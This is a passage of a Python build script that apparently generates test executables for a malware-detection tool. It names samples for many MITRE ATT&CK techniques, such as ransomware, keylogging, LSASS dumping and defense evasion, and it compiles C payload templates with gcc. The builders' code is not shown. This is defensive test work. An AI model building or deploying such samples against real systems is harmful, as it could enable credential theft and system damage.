    result["wdac_bypass_sample"] = build_wdac_bypass_sample(out_dir / "sample_wdac_bypass.exe")
    result["revoked_sig_mock"] = build_revoked_sig_mock(out_dir / "sample_revoked_sig_mock.exe")
    result["evasive_malware"] = build_evasive_malware(out_dir / "sample_evasive_malware.exe")
    result["obfuscated_dropper"] = build_obfuscated_dropper(out_dir / "sample_obfuscated_dropper.exe")
    result["suspicious_logic"] = build_suspicious_logic(out_dir / "sample_suspicious_logic.exe")
    result["weak_hardened"] = build_weak_hardened(out_dir / "sample_weak_hardened.exe")
    result["lnk_sample"] = build_lnk_sample(out_dir / "sample.lnk")
    result["emulation_payload"] = build_emulation_payload(out_dir / "sample_emulation_payload.exe")
    result["injection_chain_sample"] = build_injection_chain_sample(out_dir / "sample_injection_chain.exe")
    result["stealer_persistence_sample"] = build_stealer_persistence_sample(out_dir / "sample_stealer_persistence.exe")
    result["complex_masquerade_sample"] = build_complex_masquerade_sample(out_dir / "sample_complex_masquerade.exe")
    result["ransomware_sample"] = build_ransomware_sample(out_dir / "sample_ransomware.exe")
    result["spyware_keylogger_sample"] = build_spyware_keylogger_sample(out_dir / "sample_spyware_keylogger.exe")
    result["crypto_miner_sample"] = build_crypto_miner_sample(out_dir / "sample_crypto_miner.exe")
    # 10 новых техник MITRE ATT&CK (APT-style)
    result["t1120_peripheral_discovery"] = build_t1120_peripheral_discovery(out_dir / "sample_t1120_peripheral_discovery.exe")
    result["t1012_query_registry"] = build_t1012_query_registry(out_dir / "sample_t1012_query_registry.exe")
    result["t1083_file_discovery"] = build_t1083_file_discovery(out_dir / "sample_t1083_file_discovery.exe")
    result["t1113_screen_capture"] = build_t1113_screen_capture(out_dir / "sample_t1113_screen_capture.exe")
    result["t1057_process_discovery"] = build_t1057_process_discovery(out_dir / "sample_t1057_process_discovery.exe")
    result["t1106_native_api"] = build_t1106_native_api(out_dir / "sample_t1106_native_api.exe")
    result["t1016_network_config_discovery"] = build_t1016_network_config_discovery(out_dir / "sample_t1016_network_config.exe")
    result["t1049_network_connections_discovery"] = build_t1049_network_connections_discovery(out_dir / "sample_t1049_network_connections.exe")
    result["t1543_003_windows_service"] = build_t1543_003_windows_service(out_dir / "sample_t1543_003_windows_service.exe")
    result["t1140_deobfuscation"] = build_t1140_deobfuscation(out_dir / "sample_t1140_deobfuscation.exe")
    # 10 техник: UAC Bypass, Modify Registry, File Deletion, Time Discovery, etc.
    result["t1548_002_uac_bypass"] = build_t1548_002_uac_bypass(out_dir / "sample_t1548_002_uac_bypass.exe")
    result["t1112_modify_registry"] = build_t1112_modify_registry(out_dir / "sample_t1112_modify_registry.exe")
    result["t1070_004_file_deletion"] = build_t1070_004_file_deletion(out_dir / "sample_t1070_004_file_deletion.exe")
    result["t1124_system_time_discovery"] = build_t1124_system_time_discovery(out_dir / "sample_t1124_system_time.exe")
    result["t1082_system_info_discovery"] = build_t1082_system_info_discovery(out_dir / "sample_t1082_system_info.exe")
    result["t1573_encrypted_channel"] = build_t1573_encrypted_channel(out_dir / "sample_t1573_encrypted_channel.exe")
    result["t1005_data_local_system"] = build_t1005_data_local_system(out_dir / "sample_t1005_data_local.exe")
    result["t1518_001_security_software_discovery"] = build_t1518_001_security_software_discovery(out_dir / "sample_t1518_001_security_software.exe")
    result["t1090_proxy"] = build_t1090_proxy(out_dir / "sample_t1090_proxy.exe")
    result["t1218_011_rundll32"] = build_t1218_011_rundll32(out_dir / "sample_t1218_011_rundll32.exe")
    # 10 техник: Local Storage, Cookie, CLI Capture, Email, Staging, DNS, Cloud, Encoding, Uninstall, Winlogon
    result["t1005_sensitive_storage"] = build_t1005_sensitive_storage(out_dir / "sample_t1005_sensitive_storage.exe")
    result["t1539_steal_cookie"] = build_t1539_steal_cookie(out_dir / "sample_t1539_steal_cookie.exe")
    result["t1056_004_cli_capture"] = build_t1056_004_cli_capture(out_dir / "sample_t1056_004_cli_capture.exe")
    result["t1114_001_email_collection"] = build_t1114_001_email_collection(out_dir / "sample_t1114_001_email.exe")
    result["t1074_001_data_staging"] = build_t1074_001_data_staging(out_dir / "sample_t1074_001_data_staging.exe")
    result["t1071_004_dns_tunneling"] = build_t1071_004_dns_tunneling(out_dir / "sample_t1071_004_dns.exe")
    result["t1567_002_cloud_exfil"] = build_t1567_002_cloud_exfil(out_dir / "sample_t1567_002_cloud_exfil.exe")
    result["t1132_001_encoding"] = build_t1132_001_encoding(out_dir / "sample_t1132_001_encoding.exe")
    result["t1012_uninstall_enum"] = build_t1012_uninstall_enum(out_dir / "sample_t1012_uninstall.exe")
    result["t1547_004_winlogon"] = build_t1547_004_winlogon(out_dir / "sample_t1547_004_winlogon.exe")
    # 10 техник: Impair Defenses, Firewall, Event Log Clear, IFEO, Security Center, Hidden, Indirect Exec, Root Cert, Phishing UI
    result["t1562_001_impair_tools"] = build_t1562_001_impair_tools(out_dir / "sample_t1562_001_impair_tools.exe")
    result["t1562_004_disable_firewall"] = build_t1562_004_disable_firewall(out_dir / "sample_t1562_004_disable_firewall.exe")
    result["t1070_001_clear_event_logs"] = build_t1070_001_clear_event_logs(out_dir / "sample_t1070_001_clear_event_logs.exe")
    result["t1546_012_ifeo_injection"] = build_t1546_012_ifeo_injection(out_dir / "sample_t1546_012_ifeo.exe")
    result["t1112_security_center"] = build_t1112_security_center(out_dir / "sample_t1112_security_center.exe")
    result["t1564_001_hidden_files"] = build_t1564_001_hidden_files(out_dir / "sample_t1564_001_hidden_files.exe")
    result["t1564_003_hidden_window"] = build_t1564_003_hidden_window(out_dir / "sample_t1564_003_hidden_window.exe")
    result["t1202_indirect_command"] = build_t1202_indirect_command(out_dir / "sample_t1202_indirect_command.exe")
    result["t1553_004_install_root_cert"] = build_t1553_004_install_root_cert(out_dir / "sample_t1553_004_root_cert.exe")
    result["t1056_002_phishing_ui"] = build_t1056_002_phishing_ui(out_dir / "sample_t1056_002_phishing_ui.exe")
    # v0.1.6 Lateral Movement & Network Discovery
    result["t1018_remote_system_discovery"] = build_t1018_remote_system_discovery(out_dir / "sample_t1018_remote_system.exe")
    result["t1087_001_local_account_discovery"] = build_t1087_001_local_account_discovery(out_dir / "sample_t1087_001_local_account.exe")
    result["t1087_002_domain_account_discovery"] = build_t1087_002_domain_account_discovery(out_dir / "sample_t1087_002_domain_account.exe")
    result["t1046_network_service_discovery"] = build_t1046_network_service_discovery(out_dir / "sample_t1046_network_service.exe")
    result["t1069_001_local_groups_discovery"] = build_t1069_001_local_groups_discovery(out_dir / "sample_t1069_001_local_groups.exe")
    result["t1021_001_rdp"] = build_t1021_001_rdp(out_dir / "sample_t1021_001_rdp.exe")
    result["t1021_002_smb_admin_shares"] = build_t1021_002_smb_admin_shares(out_dir / "sample_t1021_002_smb_admin.exe")
    result["t1072_software_deployment_tools"] = build_t1072_software_deployment_tools(out_dir / "sample_t1072_sccm_pdq.exe")
    result["t1570_lateral_tool_transfer"] = build_t1570_lateral_tool_transfer(out_dir / "sample_t1570_lateral_transfer.exe")
    result["t1011_001_bluetooth_exfil"] = build_t1011_001_bluetooth_exfil(out_dir / "sample_t1011_001_bluetooth.exe")
    # Final 11 techniques (matrix 75)
    result["t1195_002_supply_chain_dll"] = build_t1195_002_supply_chain_dll(out_dir / "sample_t1195_002_supply_chain.dll")
    result["t1553_002_code_signing"] = build_t1553_002_code_signing(out_dir / "sample_t1553_002_code_signing.exe")
    result["t1078_valid_accounts"] = build_t1078_valid_accounts(out_dir / "sample_t1078_valid_accounts.exe")
    result["t1137_office_startup"] = build_t1137_office_startup(out_dir / "sample_t1137_office_startup.exe")
    result["t1546_002_screensaver"] = build_t1546_002_screensaver(out_dir / "sample_t1546_002_screensaver.exe")
    result["t1048_003_uncommon_port"] = build_t1048_003_uncommon_port(out_dir / "sample_t1048_003_uncommon_port.exe")
    result["t1562_006_hosts_blocking"] = build_t1562_006_hosts_blocking(out_dir / "sample_t1562_006_hosts.exe")
    result["t1102_web_service"] = build_t1102_web_service(out_dir / "sample_t1102_web_service.exe")
    result["t1014_rootkit"] = build_t1014_rootkit(out_dir / "sample_t1014_rootkit.sys")
    result["t1204_002_malicious_file"] = build_t1204_002_malicious_file(out_dir / "sample_t1204_002_malicious_file.exe")
    result["t1491_defacement"] = build_t1491_defacement(out_dir / "sample_t1491_defacement.exe")
    # Top-20 sub-techniques — эталонные образцы для регрессионных тестов (test_apt_techniques_coverage, test_apt_final_risk_and_mitre)
    result["t1546_003_wmi_subscription"] = build_t1546_003_wmi_subscription(out_dir / "sample_t1546_003_wmi.exe")
    result["t1547_009_shortcut_modification"] = build_t1547_009_shortcut_modification(out_dir / "sample_t1547_009_shortcut.exe")
    result["t1546_007_netsh_helper"] = build_t1546_007_netsh_helper(out_dir / "sample_t1546_007_netsh.exe")
    result["t1055_002_dll_injection"] = build_t1055_002_dll_injection(out_dir / "sample_t1055_002_dll_injection.exe")
    result["t1055_003_thread_hijacking"] = build_t1055_003_thread_hijacking(out_dir / "sample_t1055_003_thread_hijack.exe")
    result["t1070_006_timestomp"] = build_t1070_006_timestomp(out_dir / "sample_t1070_006_timestomp.exe")
    result["t1562_010_downgrade_attack"] = build_t1562_010_downgrade_attack(out_dir / "sample_t1562_010_downgrade.exe")
    result["t1218_005_mshta"] = build_t1218_005_mshta(out_dir / "sample_t1218_005_mshta.exe")
    result["t1218_010_regsvr32"] = build_t1218_010_regsvr32(out_dir / "sample_t1218_010_regsvr32.exe")
    result["t1560_001_archive_via_library"] = build_t1560_001_archive_via_library(out_dir / "sample_t1560_001_archive.exe")
    result["t1005_001_local_data_discovery"] = build_t1005_001_local_data_discovery(out_dir / "sample_t1005_001_local_data.exe")
    result["t1056_001_keyboard_logging"] = build_t1056_001_keyboard_logging(out_dir / "sample_t1056_001_keyboard.exe")
    result["t1059_001_powershell"] = build_t1059_001_powershell(out_dir / "sample_t1059_001_powershell.exe")
    result["t1059_003_cmd_shell"] = build_t1059_003_cmd_shell(out_dir / "sample_t1059_003_cmd.exe")
    result["t1082_wmic_discovery"] = build_t1082_wmic_discovery(out_dir / "sample_t1082_wmic.exe")
    result["t1016_001_ip_forward_table"] = build_t1016_001_ip_forward_table(out_dir / "sample_t1016_001_ip_forward.exe")
    result["t1069_002_domain_groups"] = build_t1069_002_domain_groups(out_dir / "sample_t1069_002_domain_groups.exe")
    result["t1204_001_malicious_link"] = build_t1204_001_malicious_link(out_dir / "sample_t1204_001_malicious.lnk")
    result["t1106_nt_map_view"] = build_t1106_nt_map_view(out_dir / "sample_t1106_nt_map.exe")
    result["t1027_002_custom_packer"] = build_t1027_002_custom_packer(out_dir / "sample_t1027_002_packer.exe")
    # Artifact Factory v1.1: evasion, language profiling, unpacking
    result["sample_packed_t1055"] = build_packed_t1055_sample(out_dir / "sample_packed_t1055.exe")
    result["rust_sample"] = build_rust_sample(out_dir / "sample_rust.exe")
    result["pyinstaller_sample"] = build_pyinstaller_sample(out_dir / "sample_pyinstaller.exe")
    result["go_sample_obfuscated"] = build_go_sample_obfuscated(out_dir / "sample_go_obfuscated.exe")
    # v1.2 Extreme Language: Nim, AutoIt, Delphi, Zig, Electron, .NET
    result["nim_sample"] = build_nim_sample(out_dir / "sample_nim.exe")
    result["autoit_sample"] = build_autoit_sample(out_dir / "sample_autoit.exe")
    result["delphi_sample"] = build_delphi_sample(out_dir / "sample_delphi.exe")
    result["zig_sample"] = build_zig_sample(out_dir / "sample_zig.exe")
    result["electron_sample"] = build_electron_sample(out_dir / "sample_electron.exe")
    result["dotnet_sample"] = build_dotnet_sample(out_dir / "sample_dotnet.exe")
    # APT-style: autoit_wrapper, themida_stub, pyinstaller_bundle, dotnet_obfuscated
    result["autoit_wrapper"] = build_autoit_wrapper(out_dir / "sample_autoit_wrapper.exe")
    result["themida_stub"] = simulate_themida_stub(out_dir / "sample_themida_stub.exe")
    result["pyinstaller_bundle"] = build_pyinstaller_bundle(out_dir / "sample_pyinstaller_bundle.exe")
    result["dotnet_obfuscated"] = build_dotnet_obfuscated(out_dir / "sample_dotnet_obfuscated.exe")
    # v2.0 Exotic: Ruby/Lua embedded, Swift, JAR-in-EXE
    result["ruby_embedded_sample"] = build_ruby_embedded_sample(out_dir / "sample_ruby_embedded.exe")
    result["lua_embedded_sample"] = build_lua_embedded_sample(out_dir / "sample_lua_embedded.exe")
    result["swift_sample"] = build_swift_sample(out_dir / "sample_swift.exe")
    result["jar_in_exe_sample"] = build_jar_in_exe_sample(out_dir / "sample_jar_in_exe.exe")
    # v0.1.9: 10 новых техник MITRE
    result["t1003_001_lsass_memory"] = build_t1003_001_lsass_memory(out_dir / "sample_t1003_001_lsass.exe")
    result["t1552_001_credentials_in_files"] = build_t1552_001_credentials_in_files(out_dir / "sample_t1552_001_credentials.exe")
    result["t1003_002_sam_dump"] = build_t1003_002_sam_dump(out_dir / "sample_t1003_002_sam.exe")
    result["t1489_service_stop"] = build_t1489_service_stop(out_dir / "sample_t1489_service_stop.exe")
    result["t1490_inhibit_system_recovery"] = build_t1490_inhibit_system_recovery(out_dir / "sample_t1490_vssadmin.exe")
    result["t1486_data_encrypted_for_impact"] = build_t1486_data_encrypted_for_impact(out_dir / "sample_t1486_ransom.exe")
    result["t1531_account_access_removal"] = build_t1531_account_access_removal(out_dir / "sample_t1531_netuserdel.exe")
    result["t1499_endpoint_dos"] = build_t1499_endpoint_dos(out_dir / "sample_t1499_dos.exe")
    result["t1020_automated_exfil"] = build_t1020_automated_exfil(out_dir / "sample_t1020_exfil.exe")
    result["t1098_account_manipulation"] = build_t1098_account_manipulation(out_dir / "sample_t1098_admin_add.exe")
    # Deep Coverage: Advanced Injection, Stealth Persistence, Defense Evasion
    result["t1055_004_apc_injection"] = build_t1055_004_apc_injection(out_dir / "sample_t1055_004_apc.exe")
    result["t1055_005_tls_injection"] = build_t1055_005_tls_injection(out_dir / "sample_t1055_005_tls.exe")
    result["t1055_011_ewmi"] = build_t1055_011_ewmi(out_dir / "sample_t1055_011_ewmi.exe")
    result["t1546_009_appcert_dlls"] = build_t1546_009_appcert_dlls(out_dir / "sample_t1546_009_appcert.exe")
    result["t1546_010_appinit_dlls"] = build_t1546_010_appinit_dlls(out_dir / "sample_t1546_010_appinit.exe")
    result["t1547_005_ssp"] = build_t1547_005_ssp(out_dir / "sample_t1547_005_ssp.exe")
    result["t1547_014_active_setup"] = build_t1547_014_active_setup(out_dir / "sample_t1547_014_active_setup.exe")
    result["t1562_009_safe_mode_boot"] = build_t1562_009_safe_mode_boot(out_dir / "sample_t1562_009_safemode.exe")
    result["t1027_003_steganography"] = build_t1027_003_steganography(out_dir / "sample_t1027_003_stego.exe")
    result["t1562_002_disable_event_logging"] = build_t1562_002_disable_event_logging(out_dir / "sample_t1562_002_etw.exe")
    result["t1021_003_dcom"] = build_t1021_003_dcom(out_dir / "sample_t1021_003_dcom.exe")
    # v3.1 QA Suite: Attack Chains, Recursive Packer, Stego
    result["chained_attack_sample"] = build_chained_attack_sample(out_dir / "sample_chained_attack.exe")
    result["recursive_packer_sample"] = build_recursive_packer_sample(out_dir / "sample_recursive_packer.exe")
    result["stego_payload_sample"] = build_stego_payload_sample(out_dir / "sample_stego_payload.exe")
    # v3.2 OSINT: образец с C2-IoC для тестов репутации
    result["sample_with_malicious_ioc"] = build_sample_with_malicious_ioc(out_dir / "sample_malicious_ioc.exe")

    # Payload-as-Code: реальная компиляция C-шаблонов (CompilerCore + ArtifactRegistry).
    # Если компилятор недоступен в PATH — добавляем типичный путь MSYS2 (Windows).
    _payload_code_errors: List[str] = []
    try:
        if sys.platform == "win32":
            _gcc_path = shutil.which("gcc") or shutil.which("gcc.exe")
            if not _gcc_path:
                for _d in ("C:\\msys64\\ucrt64\\bin", "C:\\msys64\\mingw64\\bin", "C:\\msys2\\ucrt64\\bin"):
                    if (Path(_d) / "gcc.exe").exists():
                        _path = os.environ.get("PATH", "")
                        if _d not in _path:
                            os.environ["PATH"] = _d + os.pathsep + _path
                        break
        try:
            _tests_dir = Path(__file__).resolve().parent
        except Exception:
            _tests_dir = Path("tests").resolve()
        if _tests_dir.exists() and (_tests_dir / "payload_code").exists() and str(_tests_dir) not in sys.path:
            sys.path.insert(0, str(_tests_dir))
        from payload_code import get_registry, CompilerCore
        from payload_code.pipeline import build_artifact as build_payload_artifact
        registry = get_registry()
        compiler = CompilerCore()
        if compiler.available:
            for spec in registry.specs_with_templates():
                out_path = out_dir / f"sample_{spec.test_id}_payload.exe"
                res = build_payload_artifact(compiler, spec, out_path, apply_pack=(spec.pack != "none"))
                if res.success and res.output_path:
                    result[spec.test_id] = res.output_path
                else:
                    stderr_lines = (res.stderr or "").strip().splitlines()[:3]
                    stderr_preview = "\n  ".join(stderr_lines).strip() if stderr_lines else ""
                    err = res.error or "Compile failed"
                    msg = f"[{spec.test_id}] {err}"
                    if stderr_preview:
                        msg += "\n  " + stderr_preview[:500]
                    _payload_code_errors.append(msg)
        else:
            _payload_code_errors.append("CompilerCore: gcc/mingw not found (PATH and MSYS2 fallback)")
    except ImportError as e:
        _payload_code_errors.append(f"Payload-as-Code import failed: {e}")
    except Exception as e:
        _payload_code_errors.append(f"Payload-as-Code build failed: {e}")

    if _payload_code_errors:
        for _err in _payload_code_errors[:15]:
            print(_err, file=sys.stderr)
        if len(_payload_code_errors) > 15:
            print(f"... and {len(_payload_code_errors) - 15} more", file=sys.stderr)

    return result


if __name__ == "__main__":
    import sys
    out = Path(sys.argv[1]) if len(sys.argv) > 1 else Path("tests/artifacts")
    paths = build_all(out)
    for name, p in paths.items():
        print(name, p)
